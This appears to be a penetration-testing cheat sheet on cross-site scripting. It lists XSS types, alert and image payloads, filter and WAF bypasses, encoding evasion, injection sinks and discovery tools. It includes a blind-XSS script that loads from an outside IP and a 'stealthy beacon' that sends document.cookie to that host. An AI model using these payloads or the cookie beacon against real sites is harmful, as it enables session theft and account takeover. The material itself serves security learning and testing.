## 🛡️ Cross-Site Scripting (XSS)

**Tags:** `#XSS` `#CrossSiteScripting` `#Security` `#WebAttacks`

XSS vulnerabilities occur when web applications improperly handle user-supplied input, allowing attackers to inject and execute malicious JavaScript in a victim’s browser.

---

### 🔍 Types of XSS

| Type              | Description                                                                                                    |
| ----------------- | -------------------------------------------------------------------------------------------------------------- |
| **Stored XSS**    | Payload is stored on the server (e.g., in a database) and served to users. Common in comments, forums, etc.    |
| **Reflected XSS** | Payload is reflected immediately in the response. Found in URLs, forms, or error messages.                     |
| **DOM-based XSS** | Input is processed entirely on the client side via JavaScript. Common with URL fragments or client-side logic. |

---

### 🧪 XSS Payloads for Testing

#### 🟢 Basic Alert Payloads

```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script>
```

#### 🟡 Image-Based Payloads

```html
<img src="#" onerror="alert(window.origin)">
<img src="#" onerror="alert(document.cookie)">
```

#### 🟠 DOM Manipulation

```javascript
document.write('<p>XSS Test</p>');
document.body.style.background = "#141d2b";
document.title = 'HackTheBox Academy';
document.getElementsByTagName('body')[0].innerHTML = "XSS Injected";
```

#### 🔴 Blind XSS Test

```html
<script src="http://10.10.14.172:8080/username"></script>
```

---

### 💥 Advanced Payloads & Bypass Techniques

#### 🟣 Polyglot Payloads

```html
"><script>alert('XSS')</script>
"><svg/onload=confirm`XSS`>
"><img src=x onerror=prompt(1)>
```

#### 🔵 WAF/Filter Bypasses

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>
<iframe src="javascript:alert(1)"></iframe>
```

#### 🟤 Using `setTimeout` or `setInterval`

```html
<script>setTimeout("alert('XSS')", 1000)</script>
```

---

### 🚨 Filtering Evasion Techniques

#### 🔵 Character Encoding

```html
%3Cscript%3Ealert('XSS')%3C/script%3E
```

#### 🔵 Nested HTML Entities

```html
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

#### 🔵 Event Handler Exploits

```html
<img src=x onmouseover=alert(document.cookie)>
```

---

### 🧠 Commonly Missed Injection Points

* `innerHTML`
* `document.write()`
* `location.hash`, `location.search`
* `setTimeout()`, `setInterval()`
* `<iframe src="javascript:...">`
* Inline event handlers: `onload`, `onmouseover`, `onfocus`, `onerror`, etc.
* Insecure rendering in frameworks (React, Vue, Angular)
* JSONP endpoints or `callback` parameters
* Third-party widgets or analytics scripts

---

### 🧰 Debug Tips for XSS Hunting

#### 🧪 Use Browser Console

* Run payloads manually with `alert()`, `confirm()`, or `console.log()`
* Trace execution with `console.trace()`
* Monitor DOM changes:

  ```javascript
  new MutationObserver(console.log).observe(document, { childList: true, subtree: true });
  ```

#### 🛡️ CSP Reporting for Testing

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

* Allows testing without breaking functionality.

#### 🎯 Stealthy XSS Beacon

```javascript
new Image().src = 'http://10.10.14.172:8080/xss?c=' + document.cookie;
```

#### 🔍 Codebase Grepping for Sinks

```bash
grep -i 'innerHTML' ./src/
grep -iE '(document\.write|eval|location|innerHTML)' *.js
```

#### 🛠️ Chrome DevTools Snippets

* Create reusable snippets like:

  ```javascript
  alert(document.domain);
  ```

---

### 🔗 XSS + Other Attack Chains

XSS is often just the entry point. It can lead to deeper compromise:

> * 🟩 **Session Hijacking** → Steal session cookies to impersonate users
> * 🟨 **CSRF Bypass** → Inject authenticated actions via JavaScript
> * 🟥 **Privilege Escalation** → Exploit admin panels via stored XSS
> * 🟪 **JavaScript-RCE** → Abuse browser extensions or Electron apps
> * 🟦 **Internal Access** → XSS → SSRF or access to internal admin APIs
> * 🟧 **Persistence** → Store XSS in chat, logs, dashboards, etc.

---

### 🛠️ Tools for XSS Discovery & Exploitation

Recommended tools for scanning, payload crafting, and automation:

> * **Burp Suite** – Manual testing, Repeater, XSS extension
> * **XSStrike** – Fuzzer with payload evaluation and context analysis
> * **DalFox** – Fast XSS scanner with support for blind XSS and context-awareness
> * **XSS Hunter** – Tracks triggered payloads in blind XSS scenarios
> * **HackTools (Burp Extension)** – Payload generator and quick insert
> * **DOM Invader (PortSwigger)** – DOM XSS detection directly in Burp browser

---
